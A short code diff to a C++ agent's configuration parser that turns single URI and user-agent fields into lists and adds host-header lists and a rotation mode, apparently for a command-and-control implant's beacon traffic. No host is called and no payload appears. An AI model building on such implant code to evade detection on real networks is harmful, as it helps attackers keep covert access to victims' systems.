@@ -42,12 +42,26 @@ AgentConfig::AgentConfig()
 		this->profile.ports[i]   = (WORD) packer->Unpack32();
 	}
 	this->profile.http_method  = packer->UnpackBytesCopy(&length);
-	this->profile.uri          = packer->UnpackBytesCopy(&length);
+	this->profile.uri_count    = packer->Unpack32();
+	this->profile.uris         = (BYTE**) MemAllocLocal(this->profile.uri_count * sizeof(LPVOID));
+	for (ULONG i = 0; i < this->profile.uri_count; i++) {
+		this->profile.uris[i] = packer->UnpackBytesCopy(&length);
+	}
 	this->profile.parameter    = packer->UnpackBytesCopy(&length);
-	this->profile.user_agent   = packer->UnpackBytesCopy(&length);
+	this->profile.ua_count     = packer->Unpack32();
+	this->profile.user_agents  = (BYTE**) MemAllocLocal(this->profile.ua_count * sizeof(LPVOID));
+	for (ULONG i = 0; i < this->profile.ua_count; i++) {
+		this->profile.user_agents[i] = packer->UnpackBytesCopy(&length);
+	}
 	this->profile.http_headers = packer->UnpackBytesCopy(&length);
 	this->profile.ans_pre_size = packer->Unpack32();
 	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
+	this->profile.hh_count     = packer->Unpack32();
+	this->profile.host_headers = (BYTE**) MemAllocLocal(this->profile.hh_count * sizeof(LPVOID));
+	for (ULONG i = 0; i < this->profile.hh_count; i++) {
+		this->profile.host_headers[i] = packer->UnpackBytesCopy(&length);
+	}
+	this->profile.rotation_mode = (BYTE) packer->Unpack32();
 
 	this->profile.proxy_type     = (BYTE) packer->Unpack32();
 	this->profile.proxy_host     = packer->UnpackBytesCopy(&length);
